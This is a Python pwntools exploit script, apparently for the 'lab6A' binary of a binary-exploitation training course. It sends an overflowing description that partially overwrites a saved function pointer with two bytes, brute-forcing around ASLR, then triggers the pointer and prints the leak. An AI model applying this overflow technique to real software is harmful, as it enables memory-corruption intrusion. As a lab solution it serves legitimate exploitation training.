# Based on https://github.com/ewilded/MBE-snippets/blob/master/lab6B/exploit_remote.py
from pwn import *

settings = {

    # Path to binary
    "binary"        : "./lab6A",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    # Chose action 1 (setup account).
    p.sendlineafter("Enter Choice: ", "1")  
	
    # Send the name (31 characters + newline -> 32 chars)	
    p.recvuntil("Enter your name: ")		
    payload = "A" * 0x1f # 31 A's (just to fill the username)
    p.sendline(payload)
	
	# Send the description - 90 characters + EXACTLY TWO BYTES to partially overwrite the function pointer.
	# To avoid a newline creeping in and fucking up the second byte of the address (out of bound of our PARTIAL write)
	# we want to use send_raw() instead of sendline()/sendlineafter():
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to attai the saved print_listing() address
    payload = payload + p16(0xbbe2)
    p.send(payload)
    
    # OK, call this thing:
    p.sendlineafter("Enter Choice: ", "3")
	
    # Analyze the leak (we have to introduce a way to distinguish when the execution was successful as opposed to when we crashed the thing due to the lack of lack with ASLR and our fixed 0xb halfbyte).
    leak = p.recvline()
	
	# Some verbose output for debugging/troubleshooting purpose 
    # (this is redundant with context.log_level='debug' though).
    print("This is the recvline literally printed:") 
    print(leak)
    print("recvline.size:" + str(len(leak)))
    print("recvline.type:" + str(type(leak)))


# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    p = process(binary.path)
  
    exploit()
